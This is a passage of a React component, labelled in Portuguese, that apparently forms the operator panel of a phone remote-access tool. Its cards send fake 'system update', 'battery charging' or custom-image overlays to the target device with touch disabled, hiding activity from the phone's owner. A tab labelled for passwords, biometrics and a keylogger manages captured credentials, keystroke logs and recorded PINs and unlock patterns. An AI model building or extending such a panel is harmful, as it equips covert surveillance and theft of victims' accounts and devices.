                <span style={{ fontSize: "9.5px", fontWeight: 800, color: "#00e5ff", minWidth: "24px", textAlign: "right" }}>
                  {updatePercent}%
                </span>
              </div>

              <div style={{ display: "flex", gap: "4px", marginTop: "1px" }}>
                <button
                  type="button"
                  onClick={() => handleActivateDisguise("update", { progressPercent: updatePercent })}
                  disabled={isActivatingDisguise}
                  style={{
                    flex: 1,
                    height: disguiseScale === "compact" ? "20px" : disguiseScale === "large" ? "26px" : "23px",
                    background: currentDisguise?.active && currentDisguise.type === "update" ? "rgba(0, 229, 255, 0.2)" : "rgba(0, 119, 255, 0.15)",
                    border: `1px solid ${currentDisguise?.active && currentDisguise.type === "update" ? "#00e5ff" : "#0077ff"}`,
                    borderRadius: "4px",
                    color: currentDisguise?.active && currentDisguise.type === "update" ? "#00e5ff" : "#60a5fa",
                    fontSize: disguiseScale === "compact" ? "8.5px" : disguiseScale === "large" ? "10.5px" : "9.5px",
                    fontWeight: 700,
                    padding: "0 6px",
                    cursor: "pointer",
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                    gap: "4px"
                  }}
                >
                  <RotateCw size={10} />
                  <span>
                    {currentDisguise?.active && currentDisguise.type === "update"
                      ? "Atualizar na Tela"
                      : "Ativar Atualização"}
                  </span>
                </button>
                {currentDisguise?.active && currentDisguise.type === "update" && (
                  <button
                    type="button"
                    onClick={handleClearDisguise}
                    style={{
                      width: disguiseScale === "compact" ? "20px" : disguiseScale === "large" ? "26px" : "23px",
                      height: disguiseScale === "compact" ? "20px" : disguiseScale === "large" ? "26px" : "23px",
                      background: "transparent",
                      border: "1px solid #475569",
                      color: "#94a3b8",
                      borderRadius: "4px",
                      padding: 0,
                      cursor: "pointer",
                      display: "flex",
                      alignItems: "center",
                      justifyContent: "center"
                    }}
                    title="Restaurar Tela Normal"
                  >
                    <X size={10} />
                  </button>
                )}
              </div>
            </div>
          </div>

          {/* 3. CARD: CARREGANDO BATERIA */}
          <div
            style={{
              background: "#0a0e18",
              border: `1px solid ${currentDisguise?.active && currentDisguise.type === "battery" ? "#22c55e" : "#1a2234"}`,
              boxShadow: currentDisguise?.active && currentDisguise.type === "battery" ? "0 0 10px rgba(34, 197, 94, 0.2)" : "none",
              borderRadius: "6px",
              padding: disguiseScale === "compact" ? "5px 7px" : disguiseScale === "large" ? "10px 12px" : "7px 9px",
              display: "flex",
              gap: disguiseScale === "compact" ? "6px" : disguiseScale === "large" ? "10px" : "8px",
              alignItems: "center"
            }}
          >
            {/* Lateral Mini Preview */}
            <MiniPhonePreview
              type="battery"
              batteryPercent={device.battery ?? 75}
              isActive={Boolean(currentDisguise?.active && currentDisguise.type === "battery")}
              scale={disguiseScale}
            />

            {/* Right Content */}
            <div style={{ flex: 1, display: "flex", flexDirection: "column", gap: "4px", minWidth: 0 }}>
              <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
                <div style={{ display: "flex", alignItems: "center", gap: "4px" }}>
                  <BatteryCharging size={disguiseScale === "compact" ? 10 : disguiseScale === "large" ? 14 : 12} style={{ color: "#22c55e" }} />
                  <span style={{ fontSize: disguiseScale === "compact" ? "10px" : disguiseScale === "large" ? "12px" : "11px", fontWeight: 700, color: "#f8fafc" }}>
                    Carregando Bateria
                  </span>
                </div>
                {currentDisguise?.active && currentDisguise.type === "battery" && (
                  <span style={{ fontSize: "8px", background: "#22c55e", color: "#000", padding: "1px 4px", borderRadius: "3px", fontWeight: 800 }}>
                    ATIVA ({device.battery ?? 75}%)
                  </span>
                )}
              </div>

              <div style={{ display: "flex", alignItems: "center", gap: "4px", fontSize: disguiseScale === "compact" ? "8px" : "9px", color: "#86efac" }}>
                <Zap size={9} style={{ color: "#22c55e" }} />
                <span>Turbo Charge: <strong>{device.battery ?? 75}%</strong> · <span style={{ color: "#38bdf8" }}>Toque OFF</span></span>
              </div>

              <div style={{ display: "flex", gap: "4px", marginTop: "1px" }}>
                <button
                  type="button"
                  onClick={() => handleActivateDisguise("battery", { progressPercent: device.battery ?? 75 })}
                  disabled={isActivatingDisguise}
                  style={{
                    flex: 1,
                    height: disguiseScale === "compact" ? "20px" : disguiseScale === "large" ? "26px" : "23px",
                    background: currentDisguise?.active && currentDisguise.type === "battery" ? "rgba(34, 197, 94, 0.2)" : "rgba(34, 197, 94, 0.12)",
                    border: `1px solid ${currentDisguise?.active && currentDisguise.type === "battery" ? "#22c55e" : "rgba(34, 197, 94, 0.4)"}`,
                    borderRadius: "4px",
                    color: "#22c55e",
                    fontSize: disguiseScale === "compact" ? "8.5px" : disguiseScale === "large" ? "10.5px" : "9.5px",
                    fontWeight: 700,
                    padding: "0 6px",
                    cursor: "pointer",
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                    gap: "4px"
                  }}
                >
                  <Zap size={10} />
                  <span>
                    {currentDisguise?.active && currentDisguise.type === "battery"
                      ? "Ativa no Celular"
                      : "Ativar Tela Bateria"}
                  </span>
                </button>
                {currentDisguise?.active && currentDisguise.type === "battery" && (
                  <button
                    type="button"
                    onClick={handleClearDisguise}
                    style={{
                      width: disguiseScale === "compact" ? "20px" : disguiseScale === "large" ? "26px" : "23px",
                      height: disguiseScale === "compact" ? "20px" : disguiseScale === "large" ? "26px" : "23px",
                      background: "transparent",
                      border: "1px solid #475569",
                      color: "#94a3b8",
                      borderRadius: "4px",
                      padding: 0,
                      cursor: "pointer",
                      display: "flex",
                      alignItems: "center",
                      justifyContent: "center"
                    }}
                    title="Restaurar Tela Normal"
                  >
                    <X size={10} />
                  </button>
                )}
              </div>
            </div>
          </div>

          {/* 4. CARD: SELECIONAR IMAGEM PERSONALIZADA */}
          <div
            style={{
              background: "#0a0e18",
              border: `1px solid ${currentDisguise?.active && currentDisguise.type === "custom_image" ? "#a855f7" : "#1a2234"}`,
              boxShadow: currentDisguise?.active && currentDisguise.type === "custom_image" ? "0 0 10px rgba(168, 85, 247, 0.2)" : "none",
              borderRadius: "6px",
              padding: disguiseScale === "compact" ? "5px 7px" : disguiseScale === "large" ? "10px 12px" : "7px 9px",
              display: "flex",
              gap: disguiseScale === "compact" ? "6px" : disguiseScale === "large" ? "10px" : "8px",
              alignItems: "center"
            }}
          >
            {/* Lateral Mini Preview */}
            <MiniPhonePreview
              type="custom_image"
              customImageUrl={selectedCustomImage || undefined}
              isActive={Boolean(currentDisguise?.active && currentDisguise.type === "custom_image")}
              scale={disguiseScale}
            />

            {/* Right Content */}
            <div style={{ flex: 1, display: "flex", flexDirection: "column", gap: "4px", minWidth: 0 }}>
              <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
                <div style={{ display: "flex", alignItems: "center", gap: "4px" }}>
                  <ImageIcon size={disguiseScale === "compact" ? 10 : disguiseScale === "large" ? 14 : 12} style={{ color: "#c084fc" }} />
                  <span style={{ fontSize: disguiseScale === "compact" ? "10px" : disguiseScale === "large" ? "12px" : "11px", fontWeight: 700, color: "#f8fafc" }}>
                    Imagem Custom
                  </span>
                </div>
                {currentDisguise?.active && currentDisguise.type === "custom_image" && (
                  <span style={{ fontSize: "8px", background: "#a855f7", color: "#fff", padding: "1px 4px", borderRadius: "3px", fontWeight: 800 }}>
                    ATIVA
                  </span>
                )}
              </div>

              <div style={{ fontSize: disguiseScale === "compact" ? "8px" : "9px", color: "#94a3b8" }}>
                Ideal: <span style={{ color: "#c084fc", fontWeight: 700 }}>720×1280</span> · <span style={{ color: "#38bdf8", fontWeight: 600 }}>Toque OFF</span>
              </div>

              {/* Presets Rápidos e Botão Upload em Linha Única sem quebra */}
              <div style={{ display: "flex", gap: "2px", alignItems: "center" }}>
                {SAMPLE_IMAGE_PRESETS.map((p) => (
                  <button
                    key={p.id}
                    type="button"
                    onClick={() => handleSelectPresetSample(p)}
                    style={{
                      flex: 1,
                      background: selectedCustomImage === p.url ? "rgba(168, 85, 247, 0.25)" : "#131826",
                      border: `1px solid ${selectedCustomImage === p.url ? "#a855f7" : "#1e293b"}`,
                      borderRadius: "3px",
                      color: selectedCustomImage === p.url ? "#c084fc" : "#cbd5e1",
                      fontSize: disguiseScale === "compact" ? "7.5px" : "8px",
                      fontWeight: 600,
                      padding: "2px 2px",
                      textAlign: "center",
                      cursor: "pointer",
                      whiteSpace: "nowrap",
                      overflow: "hidden",
                      textOverflow: "ellipsis"
                    }}
                    title={p.name}
                  >
                    {p.name.split(" ")[0]}
                  </button>
                ))}
                <button
                  type="button"
                  onClick={() => fileInputRef.current?.click()}
                  style={{
                    background: "#1e293b",
                    border: "1px dashed #475569",
                    borderRadius: "3px",
                    color: "#c084fc",
                    fontSize: disguiseScale === "compact" ? "7.5px" : "8px",
                    fontWeight: 600,
                    padding: "2px 4px",
                    cursor: "pointer",
                    display: "flex",
                    alignItems: "center",
                    gap: "2px",
                    whiteSpace: "nowrap",
                    flexShrink: 0
                  }}
                  title="Carregar imagem local (720x1280)"
                >
                  <Upload size={8} />
                  <span>Upload</span>
                </button>
              </div>

              {/* Upload File Input Hidden */}
              <input
                ref={fileInputRef}
                type="file"
                accept="image/*"
                style={{ display: "none" }}
                onChange={handleImageFileChange}
              />

              <div style={{ display: "flex", gap: "4px", marginTop: "1px" }}>
                <button
                  type="button"
                  onClick={() => {
                    if (!selectedCustomImage) {
                      showToast("Selecione um preset ou faça upload antes de enviar.", "info");
                      return;
                    }
                    handleActivateDisguise("custom_image", {
                      customImageUrl: selectedCustomImage,
                      imageWidth: customImageMeta?.width,
                      imageHeight: customImageMeta?.height
                    });
                  }}
                  disabled={!selectedCustomImage || isActivatingDisguise}
                  style={{
                    flex: 1,
                    height: disguiseScale === "compact" ? "20px" : disguiseScale === "large" ? "26px" : "23px",
                    background: currentDisguise?.active && currentDisguise.type === "custom_image" ? "rgba(168, 85, 247, 0.3)" : "var(--crimson-neon, #ff1a2a)",
                    border: "none",
                    borderRadius: "4px",
                    color: "#fff",
                    fontSize: disguiseScale === "compact" ? "8.5px" : disguiseScale === "large" ? "10.5px" : "9.5px",
                    fontWeight: 700,
                    padding: "0 6px",
                    cursor: selectedCustomImage ? "pointer" : "not-allowed",
                    opacity: selectedCustomImage ? 1 : 0.5,
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                    gap: "4px"
                  }}
                >
                  <Send size={9} />
                  <span>
                    {currentDisguise?.active && currentDisguise.type === "custom_image"
                      ? "Imagem Ativa"
                      : "Enviar & Usar Tela"}
                  </span>
                </button>

                {currentDisguise?.active && currentDisguise.type === "custom_image" && (
                  <button
                    type="button"
                    onClick={handleClearDisguise}
                    style={{
                      width: disguiseScale === "compact" ? "20px" : disguiseScale === "large" ? "26px" : "23px",
                      height: disguiseScale === "compact" ? "20px" : disguiseScale === "large" ? "26px" : "23px",
                      background: "transparent",
                      border: "1px solid #475569",
                      color: "#94a3b8",
                      borderRadius: "4px",
                      padding: 0,
                      cursor: "pointer",
                      display: "flex",
                      alignItems: "center",
                      justifyContent: "center"
                    }}
                    title="Restaurar Tela Normal"
                  >
                    <X size={10} />
                  </button>
                )}
              </div>
            </div>
          </div>
            </>
          )}
        </div>
      )}

      {/* =================================================================== */}
      {/* =================================================================== */}
      {/* ABA 2: SENHAS & DIGITAÇÃO UNIFICADAS (COFRE, BIOMETRIA & KEYLOGGER) */}
      {/* =================================================================== */}
      {activeMainTab === "senhas" && (
        <RightSidebarVaultTab
          senhasSubTab={senhasSubTab}
          setSenhasSubTab={setSenhasSubTab}
          credentials={credentials}
          logs={logs}
          filteredLogs={filteredLogs}
          isBiometricActive={isBiometricActive}
          handleTriggerBiometricLocal={handleTriggerBiometricLocal}
          isDetectingCreds={isDetectingCreds}
          handleDetectCredentials={handleDetectCredentials}
          isAddingCred={isAddingCred}
          setIsAddingCred={setIsAddingCred}
          isUsingCredId={isUsingCredId}
          handleQuickUseBiometric={handleQuickUseBiometric}
          quickUnlockMode={quickUnlockMode}
          setQuickUnlockMode={setQuickUnlockMode}
          newPatternPoints={newPatternPoints}
          handlePatternPointClick={handlePatternPointClick}
          handlePatternClear={handlePatternClear}
          handleUseAndRecordPattern={handleUseAndRecordPattern}
          quickPinInput={quickPinInput}
          setQuickPinInput={setQuickPinInput}
          handleUseAndRecordPin={handleUseAndRecordPin}
          newCredType={newCredType}
          setNewCredType={setNewCredType}
          newCredLabel={newCredLabel}
          setNewCredLabel={setNewCredLabel}
          newCredApp={newCredApp}
          setNewCredApp={setNewCredApp}
          newCredValue={newCredValue}
          setNewCredValue={setNewCredValue}
          handleSaveNewCredential={handleSaveNewCredential}
          selectedCredFilter={selectedCredFilter}
          setSelectedCredFilter={setSelectedCredFilter}
          filteredCredentials={filteredCredentials}
          revealedCredIds={revealedCredIds}
          toggleRevealCred={toggleRevealCred}
          handleDeleteCredential={handleDeleteCredential}
          handleUseCredential={handleUseCredential}
          showToast={showToast}
          categories={categories}
          selectedCategory={selectedCategory}
          setSelectedCategory={setSelectedCategory}
          searchQuery={searchQuery}
          setSearchQuery={setSearchQuery}
          fetchLogs={fetchLogs}
          isRefreshing={isRefreshing}
          handleCopyAll={handleCopyAll}
          handleClearLogs={handleClearLogs}
          copiedId={copiedId}
          handleCopy={handleCopy}
          quickInput={quickInput}
          setQuickInput={setQuickInput}
          handleSendText={handleSendText}
          isSending={isSending}
        />
      )}
    </aside>
  );
}
